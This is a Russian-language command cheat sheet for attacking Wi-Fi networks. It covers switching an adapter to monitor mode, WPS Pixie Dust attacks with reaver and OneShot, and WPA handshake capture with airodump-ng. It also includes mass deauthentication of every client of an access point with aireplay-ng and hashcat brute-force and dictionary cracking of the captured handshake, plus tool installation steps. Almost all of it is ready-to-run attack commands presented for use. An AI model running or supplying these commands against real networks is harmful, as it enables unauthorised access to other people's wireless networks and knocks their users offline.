#### Получение HandShake с помощью скриптов:
./1_mon.sh wlan1                                # окно 1 # Перевод интерфейса в режим монитора # device
./2_all_dump.sh wlan1                           # окно 1 # Получение списка доступных сетей    # device
./3_dump.sh wlan1 7 00:11:22:33:44:55 SSID_NAME # окно 2 # Ожидание рукопожатия                # device, channel, bssid, ssid
./4_kill.sh wlan1 00:11:22:33:44:55             # окно 3 # Деаутентификация всех клиентов      # device, bssid

#### Перевод адаптера в режим монитора:
iw dev                       # Показать wifi адаптеры
ip link set wlan1 down       # Выключить интерфейс
iw wlan1 set monitor control # Перевод интерфейса в режим монитора
ip link set wlan1 up         # Включить интерфейс

#### WPS 1 вариант:
sudo wash -i wlan1                                                         # Получение списка точек с включённым WPS
sudo reaver -i wlan1 -b 00:11:22:33:44:55 -K -vv -L -N -d 15 -T .5 -r 3:15 # Мягкий режим (Pixie Dust)
sudo reaver -i wlan1 -b 00:11:22:33:44:55 -K                               # Жёсткий режим, может вылететь таймаут (Pixie Dust)
sudo reaver -i wlan1 -b 00:11:22:33:44:55 -p 12345678                      # Подбор пароля при известном пине

#### WPS 2 вариант:
sudo wash -i wlan1                                 # Получение списка точек с включённым WPS
sudo ./oneshot.py -i wlan1 -b 00:11:22:33:44:55 -K # Pixie Dust

#### Получение HandShake:
sudo airodump-ng --manufacturer --uptime --wps wlan1               # Получение списка доступных сетей
sudo airodump-ng -c 7 --bssid 00:11:22:33:44:55 -w SSID_NAME wlan1 # Ожидание рукопожатия и сохранение HandShake в файл POINT_NAME (без расширения)
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan1                   # Деаутентификация всех клиентов точки

#### Расшифровка HandShake с помощью HashCat влоб:
cap2hccapx.bin SSID_NAME-01.cap SSID_NAME.hccapx            # Конверт файла
sudo hashcat -m 2500 -a 3 SSID_NAME.hccapx ?d?d?d?d?d?d?d?d # Брутфорс 8 цифр
sudo hashcat -m 2500 -a 3 SSID_NAME.hccapx ?l?l?l?l?l?l?l?l # Брутфорс 8 букв

#### Расшифровка HandShake с помощью HashCat по словарю:
cat rockyou.txt | sort | uniq | pw-inspector -m 8 -M 63 > newrockyou.txt                        # Очистка словаря от лишних слов
sudo hashcat --force --hwmon-temp-abort=100 -m 2500 -D 1,2 -a 0 SSID_NAME.hccapx newrockyou.txt # Подбор пароля по словарю

#### Установки
sudo apt install -y python3 wpasupplicant iw wget git 
sudo apt install -y reaver
https://github.com/drygdryg/OneShot
sudo apt install -y pixiewps
https://github.com/hashcat/hashcat-utils.git
cd src
sudo make
export PATH=$PATH:~/hashcat-utils/src
https://github.com/hashcat/hashcat.git
sudo make
sudo make install
git clone git://git.kali.org/packages/wordlists.git
